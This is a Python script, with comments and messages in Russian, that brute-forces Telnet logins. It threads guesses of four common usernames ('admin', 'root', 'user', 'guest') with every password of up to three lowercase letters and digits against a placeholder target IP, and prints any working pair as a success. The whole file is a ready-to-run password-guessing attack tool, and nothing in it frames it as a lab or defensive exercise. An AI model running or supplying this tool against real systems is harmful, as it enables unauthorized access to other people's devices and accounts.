import telnetlib
import itertools
import string
from concurrent.futures import ThreadPoolExecutor

host = "192.168.1.10"  # ЗАМЕНИ на IP цели
port = 23

logins = ["admin", "root", "user", "guest"]
charset = string.ascii_lowercase + string.digits
min_len = 1
max_len = 3
max_threads = 20

found = False

def try_login(username, password):
    global found
    if found:
        return
    try:
        tn = telnetlib.Telnet(host, port, timeout=3)
        tn.read_until(b"login: ")
        tn.write(username.encode() + b"\n")
        tn.read_until(b"Password: ")
        tn.write(password.encode() + b"\n")
        output = tn.read_some()
        if b"incorrect" not in output.lower():
            print(f"\n[!!!] УСПЕХ: {username}:{password}")
            found = True
        tn.close()
    except:
        pass

with ThreadPoolExecutor(max_workers=max_threads) as executor:
    for username in logins:
        for length in range(min_len, max_len + 1):
            for pwd_tuple in itertools.product(charset, repeat=length):
                if found:
                    break
                password = ''.join(pwd_tuple)
                print(f"Пробуем: {username}:{password}", end='\r')
                executor.submit(try_login, username, password)
